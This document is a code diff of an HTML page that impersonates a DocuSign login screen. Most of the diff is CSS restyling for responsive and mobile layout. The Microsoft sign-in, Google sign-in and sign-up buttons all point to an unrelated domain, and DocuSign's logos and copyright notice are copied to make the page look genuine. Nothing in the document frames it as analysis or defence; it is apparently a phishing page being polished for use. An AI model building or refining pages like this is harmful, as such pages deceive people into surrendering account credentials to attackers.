@@ -4,10 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Docusign</title>
-        <link rel="icon" href="https://docucdn-a.akamaihd.net/olive/images/2.64.0/global-assets/ds-icons-favicon-default-64x64.svg" type="image/svg+xml">
+
+    <link rel="icon" href="https://docucdn-a.akamaihd.net/olive/images/2.64.0/global-assets/ds-icons-favicon-default-64x64.svg" type="image/svg+xml">
     <link rel="canonical" href="https://account.docusign.com/" />
+
     <style>
-        /* General Reset */
         * {
             margin: 0;
             padding: 0;
@@ -24,15 +25,12 @@
 
         .header {
             position: absolute;
-            top: 30px;
-            left: 40px;
-            display: flex;
-            align-items: center;
+            top: 20px;
+            left: 20px;
         }
 
         .header img {
             height: 20px;
-            margin-right: 10px;
         }
 
         .main {
@@ -40,40 +38,43 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
 
+        /* Responsive container */
         .container {
             background: white;
-            width: 556px; /* Container dimensions */
-            height: 448px;
+            width: 100%;
+            max-width: 556px;
             border-radius: 12px;
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
-            padding: 30px;
+            box-shadow: 0 6px 15px rgba(0,0,0,0.1);
+            padding: 30px 20px;
         }
 
         .container h1 {
             font-size: 1.4rem;
             font-weight: 400;
             margin-bottom: 40px;
-          margin-left: 30px;
-            text-align: left; /* Align heading to the left */
+            text-align: left;
+            padding-left: 10px;
         }
 
         .button-container {
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: 40px;
         }
 
+        /* Responsive buttons */
         .button {
             display: flex;
             align-items: center;
-            justify-content: center; /* Center both icon and text horizontally */
-            gap: 10px; /* Space between the icon and text */
-            width: 426px;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            max-width: 426px;
             height: 50px;
-            margin: 30px 0;
+            margin: 15px 0;
             font-size: 1rem;
             font-weight: bold;
             border: none;
@@ -85,7 +86,7 @@
 
         .button img {
             position: absolute;
-            left: 15px; /* Position the icon to the left of the text */
+            left: 15px;
             top: 50%;
             transform: translateY(-50%);
         }
@@ -106,47 +107,35 @@
             font-size: 0.9rem;
             color: #4285f4;
             text-decoration: none;
-            cursor: pointer;
             text-align: center;
             display: block;
         }
 
         .footer {
             width: 100%;
-            height: 51px;
             background: #ffffff;
             border-top: 1px solid #ddd;
-            padding: 10px 40px;
+            padding: 20px 10px;
             font-size: 0.85rem;
-            color: #888;
             text-align: center;
         }
 
         .footer table {
             width: 100%;
-            margin-bottom: 5px;
-        }
-
-        .footer td {
-            padding: 0 10px;
+            margin-bottom: 10px;
         }
 
         .footer a {
             text-decoration: none;
             color: #4285f4;
-            font-style: italic; /* Stylish touch */
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-            color: #2b6cb3;
+            font-style: italic;
         }
 
         .footer-logo {
             display: flex;
-            align-items: center;
             justify-content: center;
-            margin-top: 5px;
+            align-items: center;
+            margin-top: 10px;
         }
 
         .footer-logo img {
@@ -158,28 +147,62 @@
             font-size: 0.75rem;
             color: #aaa;
         }
+
+        /* ---- MOBILE OPTIMIZATION ---- */
+        @media (max-width: 480px) {
+            .header {
+                top: 10px;
+                left: 10px;
+            }
+
+            .container {
+                padding: 20px 15px;
+            }
+
+            .button {
+                font-size: 0.9rem;
+                height: 45px;
+            }
+
+            .container h1 {
+                font-size: 1.2rem;
+                text-align: center;
+                padding-left: 0;
+            }
+
+            .footer td {
+                padding: 4px 0;
+                display: block;
+            }
+        }
     </style>
 </head>
+
 <body>
     <div class="header">
         <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="DocuSign Logo">
     </div>
+
     <div class="main">
         <div class="container">
             <h1>Log in to DocuSign</h1>
+
             <div class="button-container">
                 <a href="https://verify.withoodoo.sa.com/dostrYJ@S7MB/" class="button microsoft">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" width="20">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="20">
                     SIGN IN WITH MICROSOFT
                 </a>
+
                 <a href="https://verify.withoodoo.sa.com/dostrYJ@S7MB/" class="button google">
-                    <img src="https://cdn-icons-png.flaticon.com/512/2504/2504914.png" alt="Google Logo" width="20">
+                    <img src="https://cdn-icons-png.flaticon.com/512/2504/2504914.png" width="20">
                     SIGN IN WITH GOOGLE
                 </a>
             </div>
+
             <a href="https://verify.withoodoo.sa.com/dostrYJ@S7MB/" class="signup">Sign Up for Free</a>
         </div>
     </div>
+
     <div class="footer">
         <table>
             <tr>
@@ -190,11 +213,14 @@
                 <td><a href="https://red-eta.vercel.app/red.html">Trust</a></td>
             </tr>
         </table>
+
         <div class="footer-logo">
-            <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="DocuSign Logo">
+            <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg">
             <span>Powered by DocuSign</span>
         </div>
+
         <p class="footer-text">&copy; 2025 DocuSign, Inc. All rights reserved</p>
     </div>
+
 </body>
 </html>
